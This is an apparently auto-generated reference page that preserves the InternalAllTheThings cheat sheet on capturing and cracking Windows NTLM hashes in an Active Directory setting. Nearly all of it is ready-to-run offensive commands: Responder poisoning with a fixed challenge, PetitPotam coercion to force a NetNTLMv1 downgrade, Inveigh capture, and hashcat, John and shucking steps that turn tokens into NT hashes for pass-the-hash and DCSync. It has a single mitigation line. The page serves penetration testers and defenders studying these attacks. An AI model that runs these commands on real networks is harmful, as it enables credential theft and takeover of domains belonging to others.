---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Hash - Capture and Cracking

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-hash-capture` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/hash-capture.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Hash - Capture and Cracking](../../topics/active-directory/hash-capture-and-cracking.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-hash-capture |
| name | Hash - Capture and Cracking |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/hash-capture.md |

## Preserved Source Material

````yaml
_body: "# Hash - Capture and Cracking\n\n## LmCompatibilityLevel\n\nLmCompatibilityLevel is a Windows security setting that\
  \ determines the level of authentication protocol used between computers. It specifies how Windows handles NTLM and LAN\
  \ Manager (LM) authentication protocols, impacting how passwords are stored and how authentication requests are processed.\
  \ The level can range from 0 to 5, with higher levels generally providing more secure authentication methods.\n\n```ps1\n\
  reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v lmcompatibilitylevel\n```\n\n* **Level 0** - Send LM and NTLM\
  \ response; never use NTLM 2 session security. Clients use LM and NTLM authentication, and never use NTLM 2 session security;\
  \ domain controllers accept LM, NTLM, and NTLM 2 authentication.\n* **Level 1** - Use NTLM 2 session security if negotiated.\
  \ Clients use LM and NTLM authentication, and use NTLM 2 session security if the server supports it; domain controllers\
  \ accept LM, NTLM, and NTLM 2 authentication.\n* **Level 2** - Send NTLM response only. Clients use only NTLM authentication,\
  \ and use NTLM 2 session security if the server supports it; domain controllers accept LM, NTLM, and NTLM 2 authentication.\n\
  * **Level 3** - Send NTLM 2 response only. Clients use NTLM 2 authentication, and use NTLM 2 session security if the server\
  \ supports it; domain controllers accept LM, NTLM, and NTLM 2 authentication.\n* **Level 4** - Domain controllers refuse\
  \ LM responses. Clients use NTLM authentication, and use NTLM 2 session security if the server supports it; domain controllers\
  \ refuse LM authentication (that is, they accept NTLM and NTLM 2).\n* **Level 5** - Domain controllers refuse LM and NTLM\
  \ responses (accept only NTLM 2). Clients use NTLM 2 authentication, use NTLM 2 session security if the server supports\
  \ it; domain controllers refuse NTLM and LM authentication (they accept only NTLM 2).A client computer can only use one\
  \ protocol in talking to all servers. You cannot configure it, for example, to use NTLM v2 to connect to Windows 2000-based\
  \ servers and then to use NTLM to connect to other servers. This is by design.\n\n## Capturing Net-NTLMv1/NTLMv1 hashes\n\
  \n> Net-NTLMv1 (NTLMv1) authentication tokens are used for network authentication. They are derived from a challenge/response\
  \ DES-based algorithm with the user's NT-hash as symetric keys.\n\n:information_source: Coerce a callback using PetitPotam\
  \ or SpoolSample on an affected machine and downgrade the authentication to **NetNTLMv1 Challenge/Response authentication**.\
  \ This uses the outdated encryption method DES to protect the NT/LM Hashes.\n\n**Requirements**:\n\n* `LmCompatibilityLevel\
  \ = 0x1`: Send LM and NTLM response\n\n**Exploitation**:\n\n* Capturing using [lgandx/Responder](https://github.com/lgandx/Responder):\
  \ Edit the `/etc/responder/Responder.conf` file to include the magical **1122334455667788** challenge\n\n    ```ps1\n  \
  \  HTTPS = On\n    DNS = On\n    LDAP = On\n    ...\n    ; Custom challenge.\n    ; Use \"Random\" for generating a random\
  \ challenge for each requests (Default)\n    Challenge = 1122334455667788\n    ```\n\n* Fire Responder: `responder -I eth0\
  \ --lm`, if `--disable-ess` is set, extended session security will be disabled for NTLMv1 authentication\n* Force a callback:\n\
  \n    ```ps1\n    PetitPotam.exe Responder-IP DC-IP # Patched around August 2021\n    PetitPotam.py -u Username -p Password\
  \ -d Domain -dc-ip DC-IP Responder-IP DC-IP # Not patched for authenticated users\n    ```\n\n## Cracking Net-NTLMv1/NTLMv1\
  \ hashes\n\n* If you got some `NetNTLMv1 tokens`, you can try to **shuck** them online via [shuck.sh](https://shuck.sh/)\
  \ or locally/on-premise via [ShuckNT](https://github.com/yanncam/ShuckNT/) to get NT-hashes corresponding from [HIBP database](https://haveibeenpwned.com/Passwords).\
  \ If the NT-hash has previously leaked, the NetNTLMv1 is converted to NT-hash ([pass-the-hash](./hash-pass-the-hash.md)\
  \ ready) instantly. The [shucking process](https://www.youtube.com/watch?v=OQD3qDYMyYQ) works for any NetNTLMv1 with or\
  \ without ESS/SSP (challenge != `1122334455667788`) but mainly for user account (plaintext previsouly leaked).\n\n    ```ps1\n\
  \    # Submit NetNTLMv1 online to https://shuck.sh/get-shucking.php\n    # Or shuck them on-premise via ShuckNT script:\n\
  \    $ php shucknt.php -f tokens-samples.txt -w pwned-passwords-ntlm-reversed-ordered-by-hash-v8.bin\n\n    [...]\n    10\
  \ hashes-challenges analyzed in 3 seconds, with 8 NT-Hash instantly broken for pass-the-hash and 1 that can be broken via\
  \ crack.sh for free.\n    [INPUT] ycam::ad:DEADC0DEDEADC0DE00000000000000000000000000000000:70C249F75FB6D2C0AC2C2D3808386CCAB1514A2095C582ED:1122334455667788\n\
  \    [NTHASH-SHUCKED] 93B3C62269D55DB9CA660BBB91E2BD0B\n    ```\n\n* If you got some `NetNTLMv1 tokens`, you can also try\
  \ to crack them via [crack.sh](https://crack.sh/)/[ntlmv1.com](https://ntlmv1.com/). For this you need to format them to\
  \ submit them on [crack.sh](https://crack.sh/netntlm/)/[ntlmv1.com](https://ntlmv1.com/). The converter of [shuck.sh](https://shuck.sh/)\
  \ can be used to format easily.\n\n    ```ps1\n    # When there is no-ESS/SSP and the challenge is set to 1122334455667788,\
  \ it's free (0$):\n    username::hostname:response:response:challenge -> NTHASH:response\n    NTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972\n\
  \n    # When there is ESS/SSP or challenge != 1122334455667788, it's chargeable from $20-$200:\n    username::hostname:lmresponse+0padding:ntresponse:challenge\
  \ -> $NETNTLM$challenge$ntresponse\n    $NETNTLM$DEADC0DEDEADC0DE$507E2A2131F4AF4A299D8845DE296F122CA076D49A80476E\n   \
  \ ```\n\n* Finaly, if no [shuck.sh](https://shuck.sh/) nor [crack.sh](https://crack.sh/) can be used, you can try to break\
  \ NetNTLMv1 with Hashcat / John The Ripper. Use [Net-NTLMv1 Rainbow Tables](https://tables.blurbdust.pw/) to speed up the\
  \ plain text recovery.\n\n    ```ps1\n    john --format=netntlm hash.txt\n    hashcat -m 5500 -a 3 hash.txt # for NetNTLMv1(-ESS/SSP)\
  \ to plaintext (for user account)\n    hashcat -m 27000 -a 0 hash.txt nthash-wordlist.txt # for NetNTLMv1(-ESS/SSP) to NT-hash\
  \ (for user and computer account, depending on nthash-wordlist quality)\n    hashcat -m 14000 -a 3 inputs.txt --hex-charset\
  \ -1 /usr/share/hashcat/charsets/DES_full.hcchr ?1?1?1?1?1?1?1?1 # for NetNTLMv1(-ESS/SSP) to DES-keys (KPA-attack) of user/computer\
  \ account with 100% success rate, then regenerate NT-hash with these DES-keys on https://shuck.sh/converter.php.\n    ```\n\
  \n* Now you can DCSync using the Pass-The-Hash with the DC machine account\n\n:warning: NetNTLMv1 with ESS / SSP (Extended\
  \ Session Security / Security Support Provider) changes the final challenge by adding a new alea (!= `1122334455667788`,\
  \ so chargeable on [crack.sh](https://crack.sh/)).\n\n:warning: NetNTLMv1 format is `login::domain:lmresp:ntresp:clientChall`.\
  \ If the `lmresp` contains a **0's-padding** this means that the token is protected by **ESS/SSP**.\n\n:warning: NetNTLMv1\
  \ final challenge is the Responder's challenge itself (`1122334455667788`) when there is no ESS/SSP. If ESS/SSP is enabled,\
  \ the final challenge is the first 8 bytes of the MD5 hash from the concatenation of the client challenge and server challenge.\
  \ The details of the algorithmic generation of a NetNTLMv1 are illustrated on the [shuck.sh Generator](https://shuck.sh/generator.php)\
  \ and detailed in [MISCMag#128](https://connect.ed-diamond.com/misc/misc-128/shuck-hash-before-trying-to-crack-it).\n\n\
  :warning: If you get some tokens from other tools ([OpenSecurityResearch/hostapd-wpe](https://github.com/OpenSecurityResearch/hostapd-wpe)\
  \ or [moxie0/chapcrack](https://github.com/moxie0/chapcrack)) in other formats, like tokens starting with the prefix `$MSCHAPv2$`,\
  \ `$NETNTLM$` or `$99$`, they correspond to a classic NetNTLMv1 and can be converted from one format to another [here](https://shuck.sh/converter.php).\n\
  \n**Mitigations**:\n\n* Set the Lan Manager authentication level to `Send NTLMv2 responses only. Refuse LM & NTLM`\n\n##\
  \ Capturing and cracking Net-NTLMv2/NTLMv2 hashes\n\nIf any user in the network tries to access a machine and mistype the\
  \ IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison\
  \ `LLMNR`, `MDNS` and `NETBIOS` requests on the network.\n\n* [lgandx/Responder](https://github.com/lgandx/Responder)\n\n\
  \    ```powershell\n    sudo ./Responder.py -I eth0 -wfrd -P -v\n    ```\n\n* [Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)\n\
  \n    ```powershell\n    .\\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6\
  \ Y [-Elevated N]\n    ```\n\n* [EmpireProject/Invoke-Inveigh.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1)\n\
  \n    ```powershell\n    Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts\
  \ Y\n    ```\n\nCrack the hashes with Hashcat / John The Ripper\n\n```ps1\njohn --format=netntlmv2 hash.txt\nhashcat -m\
  \ 5600 -a 3 hash.txt\n```\n\n## References\n\n* [NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021](https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb)\n\
  * [Practical Attacks against NTLMv1 - Esteban Rodriguez - September 15, 2022](https://trustedsec.com/blog/practical-attacks-against-ntlmv1)\n\
  * [Attacking LM/NTLMv1 Challenge/Response Authentication - defence in depth - April 21, 2011](http://www.defenceindepth.net/2011/04/attacking-lmntlmv1-challengeresponse_21.html)\n\
  * [CRACKING NETLM/NETNTLMV1 AUTHENTICATION - crack.sh](https://crack.sh/netntlm/)\n* [NTLMv1 to NTLM Reversing - evilmog\
  \ - 03-03-2020](https://hashcat.net/forum/thread-9009-post-47806.html)"
_relative_path: active-directory/hash-capture.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/hash-capture.md
````
